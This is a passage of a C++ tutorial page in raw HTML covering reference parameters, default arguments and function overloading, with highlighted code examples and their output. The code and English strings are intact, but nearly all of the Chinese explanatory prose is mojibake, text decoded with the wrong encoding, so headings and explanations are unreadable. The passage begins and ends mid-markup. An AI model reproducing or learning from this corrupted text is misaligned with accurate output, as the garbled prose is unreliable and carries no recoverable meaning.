</span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derived::show()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">const</span> Base&amp; obj)</span> </span>&#123; <span class="comment">// å‚æ•°æ˜¯åŸºç±»çš„å¸¸é‡å¼•ç”¨</span></span><br><span class="line">    obj.show(); <span class="comment">// è°ƒç”¨è™šå‡½æ•°ï¼Œä¼šæ ¹æ® obj å®é™…å¼•ç”¨çš„å¯¹è±¡ç±»å‹æ‰§è¡Œç›¸åº”ç‰ˆæœ¬</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Base b;</span><br><span class="line">    Derived d;</span><br><span class="line"></span><br><span class="line">    display(b); <span class="comment">// è¾“å‡º: Base::show()</span></span><br><span class="line">    display(d); <span class="comment">// è¾“å‡º: Derived::show() (å¤šæ€è¡Œä¸º)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-2-7-ä½•æ—¶ä½¿ç”¨å¼•ç”¨å‚æ•°"><a href="#8-2-7-ä½•æ—¶ä½¿ç”¨å¼•ç”¨å‚æ•°" class="headerlink" title="8.2.7 ä½•æ—¶ä½¿ç”¨å¼•ç”¨å‚æ•°"></a>8.2.7 ä½•æ—¶ä½¿ç”¨å¼•ç”¨å‚æ•°</h3><p>é€‰æ‹©ä½¿ç”¨å€¼ä¼ é€’ã€æŒ‡é’ˆä¼ é€’è¿˜æ˜¯å¼•ç”¨ä¼ é€’å–å†³äºå…·ä½“éœ€æ±‚ï¼š</p><ol><li><p><strong>æŒ‰å€¼ä¼ é€’ (<code>type param</code>)</strong>:</p><ul><li>  é€‚ç”¨äºå°å‹æ•°æ®ç±»å‹ï¼ˆ<code>int</code>, <code>double</code>, <code>bool</code>, æŒ‡é’ˆæœ¬èº«ï¼‰ã€‚</li><li>  å½“å‡½æ•°éœ€è¦æ“ä½œæ•°æ®çš„å‰¯æœ¬è€Œä¸å½±å“åŸå§‹æ•°æ®æ—¶ã€‚</li><li>  ç®€å•æ˜“æ‡‚ã€‚</li></ul></li><li><p><strong>æŒ‰æŒ‡é’ˆä¼ é€’ (<code>type* param</code>)</strong>:</p><ul><li>  å½“å‡½æ•°éœ€è¦ä¿®æ”¹è°ƒç”¨è€…çš„åŸå§‹æ•°æ®æ—¶ï¼ˆä¼ ç»Ÿ C é£æ ¼ï¼‰ã€‚</li><li>  å½“éœ€è¦è¡¨ç¤ºâ€œå¯é€‰â€å‚æ•°ï¼ˆå¯ä»¥ä¼ é€’ <code>nullptr</code>ï¼‰æ—¶ã€‚</li><li>  ä¸ C åº“æˆ–æ—§ä»£ç äº¤äº’æ—¶ã€‚</li><li>  ä¼ é€’å¤§å‹å¯¹è±¡ä»¥é¿å…å¤åˆ¶å¼€é”€ï¼ˆä½†é€šå¸¸å¼•ç”¨æ›´å—æ¬¢è¿ï¼‰ã€‚</li></ul></li><li><p><strong>æŒ‰å¼•ç”¨ä¼ é€’ (<code>type&amp; param</code>)</strong>:</p><ul><li>  å½“å‡½æ•°<strong>éœ€è¦ä¿®æ”¹</strong>è°ƒç”¨è€…çš„åŸå§‹æ•°æ®æ—¶ï¼ˆC++ é£æ ¼ï¼Œé€šå¸¸æ¯”æŒ‡é’ˆæ›´ç®€æ´å®‰å…¨ï¼‰ã€‚</li><li>  ä¼ é€’å¤§å‹å¯¹è±¡ï¼ˆç»“æ„ã€ç±»ï¼‰ä»¥<strong>é¿å…å¤åˆ¶å¼€é”€</strong>ï¼Œä½†å‡½æ•°<strong>ä¸éœ€è¦ä¿®æ”¹</strong>å¯¹è±¡æ—¶ï¼Œåº”ä½¿ç”¨**å¸¸é‡å¼•ç”¨ (<code>const type&amp; param</code>)**ã€‚è¿™æ˜¯ C++ ä¸­éå¸¸å¸¸è§çš„åšæ³•ï¼Œå…¼å…·æ•ˆç‡å’Œå®‰å…¨æ€§ã€‚</li></ul></li></ol><p><strong>ç»éªŒæ³•åˆ™:</strong></p><ul><li>  å¯¹äºå†…ç½®ç±»å‹å’Œå°å‹ç»“æ„ï¼Œä¼˜å…ˆè€ƒè™‘<strong>æŒ‰å€¼ä¼ é€’</strong>ã€‚</li><li>  å¯¹äºéœ€è¦ä¿®æ”¹è°ƒç”¨è€…æ•°æ®çš„å¤§å‹å¯¹è±¡æˆ–å‡½æ•°ï¼Œä½¿ç”¨<strong>æŒ‰å¼•ç”¨ä¼ é€’</strong> (<code>type&amp;</code>)ã€‚</li><li>  å¯¹äºä¸éœ€è¦ä¿®æ”¹è°ƒç”¨è€…æ•°æ®çš„å¤§å‹å¯¹è±¡ï¼Œä½¿ç”¨<strong>æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’</strong> (<code>const type&amp;</code>) ä»¥æé«˜æ•ˆç‡å’Œå®‰å…¨æ€§ã€‚</li><li>  åœ¨éœ€è¦è¡¨ç¤ºå¯é€‰å‚æ•°æˆ–ä¸ C é£æ ¼ä»£ç äº¤äº’æ—¶ï¼Œè€ƒè™‘ä½¿ç”¨<strong>æŒ‰æŒ‡é’ˆä¼ é€’</strong> (<code>type*</code>)ã€‚</li></ul><p>å¼•ç”¨æ˜¯ C++ ä¸­ä¸€ä¸ªå¼ºå¤§ä¸”å¸¸ç”¨çš„ç‰¹æ€§ï¼Œå°¤å…¶æ˜¯åœ¨å‡½æ•°å‚æ•°å’Œè¿”å›å€¼ä¸­ï¼Œå®ƒæä¾›äº†æŒ‡é’ˆä¹‹å¤–çš„å¦ä¸€ç§å¤„ç†é—´æ¥è®¿é—®å’Œé¿å…å¤åˆ¶çš„æ–¹å¼ã€‚</p><h2 id="8-3-é»˜è®¤å‚æ•°"><a href="#8-3-é»˜è®¤å‚æ•°" class="headerlink" title="8.3 é»˜è®¤å‚æ•°"></a>8.3 é»˜è®¤å‚æ•°</h2><p>C++ å…è®¸åœ¨å‡½æ•°å£°æ˜ï¼ˆåŸå‹ï¼‰æˆ–å®šä¹‰ä¸­ä¸ºå‡½æ•°çš„å‚æ•°æŒ‡å®š<strong>é»˜è®¤å€¼</strong>ã€‚å¦‚æœåœ¨è°ƒç”¨å‡½æ•°æ—¶æ²¡æœ‰ä¸ºå¸¦æœ‰é»˜è®¤å€¼çš„å‚æ•°æä¾›å®å‚ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ä½¿ç”¨è¯¥å‚æ•°çš„é»˜è®¤å€¼ã€‚å¦‚æœæä¾›äº†å®å‚ï¼Œåˆ™ä½¿ç”¨æä¾›çš„å®å‚å€¼ï¼Œè¦†ç›–é»˜è®¤å€¼ã€‚</p><p><strong>ç›®çš„:</strong></p><ul><li>  æé«˜å‡½æ•°çš„çµæ´»æ€§ï¼Œå…è®¸ç”¨æˆ·åœ¨è°ƒç”¨æ—¶çœç•¥æŸäº›ä¸å¸¸ç”¨çš„å‚æ•°ã€‚</li><li>  ç®€åŒ–å‡½æ•°è°ƒç”¨ï¼Œç‰¹åˆ«æ˜¯å½“æŸäº›å‚æ•°åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½ä½¿ç”¨ç›¸åŒçš„å€¼æ—¶ã€‚</li></ul><h3 id="ç”¨æ³•-1"><a href="#ç”¨æ³•-1" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h3><p>åœ¨å‡½æ•°åŸå‹æˆ–å®šä¹‰ä¸­ï¼Œé€šè¿‡åœ¨å‚æ•°å£°æ˜åä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦ <code>=</code> æ¥æŒ‡å®šé»˜è®¤å€¼ã€‚</p><p><strong>è¯­æ³• (åœ¨åŸå‹ä¸­æŒ‡å®š):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(type param1, type param2 = default_value2, type param3 = default_value3)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>é‡è¦è§„åˆ™:</strong></p><ol><li><strong>ä»å³åˆ°å·¦è§„åˆ™:</strong> å¿…é¡»ä¸ºå‡½æ•°å‚æ•°åˆ—è¡¨<strong>ä»å³åˆ°å·¦</strong>ä¾æ¬¡æä¾›é»˜è®¤å€¼ã€‚å¦‚æœæŸä¸ªå‚æ•°æœ‰é»˜è®¤å€¼ï¼Œåˆ™å…¶å³ä¾§çš„æ‰€æœ‰å‚æ•°<strong>å¿…é¡»</strong>ä¹Ÿæœ‰é»˜è®¤å€¼ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆæ³•</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b = <span class="number">10</span>, <span class="keyword">int</span> c = <span class="number">20</span>)</span></span>;</span><br><span class="line"><span class="comment">// åˆæ³•</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">(<span class="keyword">int</span> a = <span class="number">5</span>, <span class="keyword">int</span> b = <span class="number">10</span>, <span class="keyword">int</span> c = <span class="number">20</span>)</span></span>;</span><br><span class="line"><span class="comment">// éæ³•ï¼å¦‚æœ b æœ‰é»˜è®¤å€¼ï¼Œc å¿…é¡»ä¹Ÿæœ‰</span></span><br><span class="line"><span class="comment">// void func_error(int a, int b = 10, int c);</span></span><br></pre></td></tr></table></figure></li><li> <strong>åŸå‹ vs. å®šä¹‰:</strong> é»˜è®¤å‚æ•°å€¼é€šå¸¸åœ¨<strong>å‡½æ•°åŸå‹</strong>ï¼ˆå£°æ˜ï¼‰ä¸­æŒ‡å®šï¼Œè€Œä¸æ˜¯åœ¨å‡½æ•°å®šä¹‰ä¸­ã€‚å¦‚æœåœ¨åŸå‹ä¸­æŒ‡å®šäº†é»˜è®¤å€¼ï¼Œåˆ™å®šä¹‰ä¸­ä¸èƒ½å†æ¬¡æŒ‡å®šã€‚å¦‚æœå‡½æ•°æ²¡æœ‰å•ç‹¬çš„åŸå‹ï¼ˆå®šä¹‰åœ¨è°ƒç”¨ä¹‹å‰ï¼‰ï¼Œåˆ™å¯ä»¥åœ¨å®šä¹‰ä¸­æŒ‡å®šé»˜è®¤å€¼ã€‚å°†é»˜è®¤å€¼æ”¾åœ¨åŸå‹ä¸­ï¼ˆé€šå¸¸åœ¨å¤´æ–‡ä»¶é‡Œï¼‰æ˜¯æ›´å¥½çš„åšæ³•ï¼Œå› ä¸ºå®ƒå‘è°ƒç”¨è€…æ¸…æ™°åœ°å±•ç¤ºäº†å¯ä»¥çœç•¥å“ªäº›å‚æ•°ã€‚</li><li><strong>è°ƒç”¨æ—¶çš„åŒ¹é…:</strong> è°ƒç”¨å‡½æ•°æ—¶ï¼Œæä¾›çš„å®å‚ä¼š<strong>ä»å·¦åˆ°å³</strong>åŒ¹é…å‚æ•°ã€‚ä¸èƒ½è·³è¿‡æ²¡æœ‰é»˜è®¤å€¼çš„å‚æ•°å»ä¸ºæœ‰é»˜è®¤å€¼çš„å‚æ•°æä¾›å€¼ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">func1(<span class="number">1</span>);       <span class="comment">// ç­‰æ•ˆäº func1(1, 10, 20)</span></span><br><span class="line">func1(<span class="number">1</span>, <span class="number">50</span>);   <span class="comment">// ç­‰æ•ˆäº func1(1, 50, 20)</span></span><br><span class="line">func1(<span class="number">1</span>, <span class="number">50</span>, <span class="number">30</span>); <span class="comment">// ç­‰æ•ˆäº func1(1, 50, 30)</span></span><br><span class="line"><span class="comment">// func1(1, , 30); // éæ³•ï¼ä¸èƒ½è·³è¿‡å‚æ•° b</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ï¼ŒæŒ‡å®šé»˜è®¤å‚æ•°</span></span><br><span class="line"><span class="comment">// level é»˜è®¤ä¸º 1ï¼Œ prefix é»˜è®¤ä¸º &quot;Log: &quot;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">log_message</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message, <span class="keyword">int</span> level = <span class="number">1</span>, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; prefix = <span class="string">&quot;Log: &quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨æ–¹å¼ 1: æä¾›æ‰€æœ‰å‚æ•°</span></span><br><span class="line">    log_message(<span class="string">&quot;System started.&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Info: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨æ–¹å¼ 2: çœç•¥æœ€å³è¾¹çš„ prefix å‚æ•°ï¼Œä½¿ç”¨å…¶é»˜è®¤å€¼</span></span><br><span class="line">    log_message(<span class="string">&quot;Processing data...&quot;</span>, <span class="number">2</span>); <span class="comment">// prefix ä½¿ç”¨ &quot;Log: &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨æ–¹å¼ 3: çœç•¥ level å’Œ prefix å‚æ•°ï¼Œä½¿ç”¨å®ƒä»¬çš„é»˜è®¤å€¼</span></span><br><span class="line">    log_message(<span class="string">&quot;Operation complete.&quot;</span>); <span class="comment">// level ä½¿ç”¨ 1, prefix ä½¿ç”¨ &quot;Log: &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// log_message(&quot;Error occurred&quot;, , &quot;Error: &quot;); // éæ³•ï¼ä¸èƒ½è·³è¿‡ level</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰ (æ³¨æ„ï¼šè¿™é‡Œä¸å†é‡å¤é»˜è®¤å€¼)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">log_message</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message, <span class="keyword">int</span> level, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; prefix)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; prefix &lt;&lt; <span class="string">&quot;[Level &quot;</span> &lt;&lt; level &lt;&lt; <span class="string">&quot;] &quot;</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Info: [Level 0] System started.</span><br><span class="line">Log: [Level 2] Processing data...</span><br><span class="line">Log: [Level 1] Operation complete.</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ol><li> <code>log_message</code> å‡½æ•°çš„åŸå‹ä¸º <code>level</code> å’Œ <code>prefix</code> å‚æ•°æŒ‡å®šäº†é»˜è®¤å€¼ã€‚</li><li><code>main</code> å‡½æ•°å±•ç¤ºäº†ä¸åŒçš„è°ƒç”¨æ–¹å¼ï¼š<ul><li>  ç¬¬ä¸€æ¬¡è°ƒç”¨æä¾›äº†æ‰€æœ‰ä¸‰ä¸ªå‚æ•°ã€‚</li><li>  ç¬¬äºŒæ¬¡è°ƒç”¨åªæä¾›äº† <code>message</code> å’Œ <code>level</code>ï¼Œ<code>prefix</code> ä½¿ç”¨äº†é»˜è®¤å€¼ <code>&quot;Log: &quot;</code>ã€‚</li><li>  ç¬¬ä¸‰æ¬¡è°ƒç”¨åªæä¾›äº† <code>message</code>ï¼Œ<code>level</code> ä½¿ç”¨äº†é»˜è®¤å€¼ <code>1</code>ï¼Œ<code>prefix</code> ä½¿ç”¨äº†é»˜è®¤å€¼ <code>&quot;Log: &quot;</code>ã€‚</li></ul></li><li> å‡½æ•°å®šä¹‰éƒ¨åˆ†æ²¡æœ‰é‡å¤é»˜è®¤å€¼ï¼Œåªåˆ—å‡ºäº†å‚æ•°ç±»å‹å’Œåç§°ã€‚</li></ol><p>é»˜è®¤å‚æ•°æ˜¯ C++ ä¸­ä¸€ä¸ªæ–¹ä¾¿çš„ç‰¹æ€§ï¼Œå¯ä»¥ä½¿å‡½æ•°æ¥å£æ›´åŠ çµæ´»å’Œæ˜“ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å…·æœ‰å¤šä¸ªé…ç½®é€‰é¡¹æˆ–ä¸å¸¸ç”¨å‚æ•°çš„å‡½æ•°æ—¶ã€‚</p><h2 id="8-4-å‡½æ•°é‡è½½"><a href="#8-4-å‡½æ•°é‡è½½" class="headerlink" title="8.4 å‡½æ•°é‡è½½"></a>8.4 å‡½æ•°é‡è½½</h2><p><strong>å‡½æ•°é‡è½½ (Function Overloading)</strong> æ˜¯ C++ çš„ä¸€é¡¹ç‰¹æ€§ï¼Œå…è®¸åœ¨<strong>åŒä¸€ä¸ªä½œç”¨åŸŸ</strong>å†…å®šä¹‰å¤šä¸ªåŒåå‡½æ•°ï¼Œåªè¦å®ƒä»¬çš„<strong>å‚æ•°åˆ—è¡¨ï¼ˆä¹Ÿç§°ä¸ºå‡½æ•°ç­¾åï¼‰</strong>ä¸åŒå³å¯ã€‚å‚æ•°åˆ—è¡¨çš„ä¸åŒå¯ä»¥ä½“ç°åœ¨å‚æ•°çš„<strong>æ•°é‡</strong>ã€<strong>ç±»å‹</strong>æˆ–<strong>é¡ºåº</strong>ä¸Šã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®å‡½æ•°è°ƒç”¨æ—¶æä¾›çš„å®å‚ç±»å‹å’Œæ•°é‡æ¥å†³å®šå…·ä½“è°ƒç”¨å“ªä¸ªé‡è½½ç‰ˆæœ¬ã€‚</p><p><strong>å‡½æ•°ç­¾å:</strong> å‡½æ•°çš„åç§°å’Œå…¶å‚æ•°åˆ—è¡¨ï¼ˆå‚æ•°çš„ç±»å‹ã€æ•°é‡å’Œé¡ºåºï¼‰å…±åŒæ„æˆäº†å‡½æ•°ç­¾åã€‚<strong>æ³¨æ„ï¼šå‡½æ•°çš„è¿”å›ç±»å‹ä¸å±äºå‡½æ•°ç­¾åçš„ä¸€éƒ¨åˆ†ï¼Œä¸èƒ½ä»…å‡­è¿”å›ç±»å‹ä¸åŒæ¥é‡è½½å‡½æ•°ã€‚</strong></p><p><strong>ç›®çš„:</strong></p><ul><li>  å…è®¸ä½¿ç”¨ç›¸åŒçš„å‡½æ•°åæ¥æ‰§è¡Œæ¦‚å¿µä¸Šç›¸ä¼¼ä½†æ“ä½œäºä¸åŒæ•°æ®ç±»å‹æˆ–å‚æ•°ç»„åˆçš„ä»»åŠ¡ã€‚</li><li>  æé«˜ä»£ç çš„å¯è¯»æ€§å’Œæ˜“ç”¨æ€§ï¼Œç”¨æˆ·ä¸å¿…ä¸ºç›¸ä¼¼æ“ä½œè®°ä½å¤šä¸ªä¸åŒçš„å‡½æ•°åã€‚</li></ul><h3 id="8-4-1-é‡è½½ç¤ºä¾‹"><a href="#8-4-1-é‡è½½ç¤ºä¾‹" class="headerlink" title="8.4.1 é‡è½½ç¤ºä¾‹"></a>8.4.1 é‡è½½ç¤ºä¾‹</h3><p>å‡è®¾æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå‡½æ•°æ¥æ‰“å°ä¸åŒç±»å‹çš„æ•°æ®ã€‚ä½¿ç”¨å‡½æ•°é‡è½½ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰å¤šä¸ªåä¸º <code>print</code> çš„å‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡è½½ç‰ˆæœ¬ 1: æ‰“å° int</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing int: &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡è½½ç‰ˆæœ¬ 2: æ‰“å° double</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">double</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing double: &quot;</span> &lt;&lt; d &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡è½½ç‰ˆæœ¬ 3: æ‰“å°å­—ç¬¦ä¸² (const char*)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing C-string: &quot;</span> &lt;&lt; s &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡è½½ç‰ˆæœ¬ 4: æ‰“å° std::string (å¸¸é‡å¼•ç”¨)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing std::string: &quot;</span> &lt;&lt; s &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡è½½ç‰ˆæœ¬ 5: æ‰“å°ä¸¤ä¸ª int</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing two ints: &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é”™è¯¯ç¤ºä¾‹ï¼šä»…è¿”å›ç±»å‹ä¸åŒï¼Œæ— æ³•é‡è½½</span></span><br><span class="line"><span class="comment">// int print(int i) &#123;</span></span><br><span class="line"><span class="comment">//     std::cout &lt;&lt; &quot;Trying to return int: &quot; &lt;&lt; i &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//     return i;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    print(<span class="number">10</span>);          <span class="comment">// è°ƒç”¨ç‰ˆæœ¬ 1 (int)</span></span><br><span class="line">    print(<span class="number">3.14</span>);        <span class="comment">// è°ƒç”¨ç‰ˆæœ¬ 2 (double)</span></span><br><span class="line">    print(<span class="string">&quot;Hello&quot;</span>);     <span class="comment">// è°ƒç”¨ç‰ˆæœ¬ 3 (const char*)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> msg = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">    print(msg);         <span class="comment">// è°ƒç”¨ç‰ˆæœ¬ 4 (const std::string&amp;)</span></span><br><span class="line">    print(<span class="number">5</span>, <span class="number">20</span>);       <span class="comment">// è°ƒç”¨ç‰ˆæœ¬ 5 (int, int)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// print(10L); // å¯èƒ½äº§ç”Ÿæ­§ä¹‰è°ƒç”¨ï¼Œå› ä¸º long å¯ä»¥è½¬æ¢ä¸º int æˆ– double</span></span><br><span class="line">                 <span class="comment">// ç¼–è¯‘å™¨å¯èƒ½æŠ¥é”™æˆ–é€‰æ‹©ä¸€ä¸ªæœ€ä½³åŒ¹é…</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ul><li>  æˆ‘ä»¬å®šä¹‰äº†äº”ä¸ªåä¸º <code>print</code> çš„å‡½æ•°ï¼Œä½†å®ƒä»¬çš„å‚æ•°åˆ—è¡¨å„ä¸ç›¸åŒï¼ˆç±»å‹æˆ–æ•°é‡ä¸åŒï¼‰ã€‚</li><li>  åœ¨ <code>main</code> å‡½æ•°ä¸­ï¼Œç¼–è¯‘å™¨æ ¹æ®ä¼ é€’ç»™ <code>print</code> çš„å®å‚ç±»å‹å’Œæ•°é‡ï¼Œè‡ªåŠ¨é€‰æ‹©äº†æ­£ç¡®çš„é‡è½½ç‰ˆæœ¬è¿›è¡Œè°ƒç”¨ã€‚</li></ul><p><strong>åç§°ä¿®é¥° (Name Mangling):</strong></p><p>C++ ç¼–è¯‘å™¨å†…éƒ¨é€šè¿‡ä¸€ç§ç§°ä¸º<strong>åç§°ä¿®é¥°</strong>æˆ–<strong>åç§°æ”¹ç¼–</strong>ï¼ˆName Manglingï¼‰çš„æŠ€æœ¯æ¥åŒºåˆ†åŒåçš„é‡è½½å‡½æ•°ã€‚å®ƒä¼šæ ¹æ®å‡½æ•°çš„ç­¾åï¼ˆåŒ…æ‹¬å‚æ•°ç±»å‹ï¼‰ç”Ÿæˆä¸€ä¸ªå†…éƒ¨å”¯ä¸€çš„åç§°ã€‚ä¾‹å¦‚ï¼Œ<code>print(int)</code> å’Œ <code>print(double)</code> åœ¨ç¼–è¯‘åä¼šå˜æˆä¸åŒçš„å†…éƒ¨åç§°ï¼Œè¿™æ ·é“¾æ¥å™¨å°±èƒ½æ­£ç¡®åœ°å°†å‡½æ•°è°ƒç”¨é“¾æ¥åˆ°å¯¹åº”çš„å‡½æ•°å®šä¹‰ã€‚</p><h3 id="8-4-2-ä½•æ—¶ä½¿ç”¨å‡½æ•°é‡è½½"><a href="#8-4-2-ä½•æ—¶ä½¿ç”¨å‡½æ•°é‡è½½" class="headerlink" title="8.4.2 ä½•æ—¶ä½¿ç”¨å‡½æ•°é‡è½½"></a>8.4.2 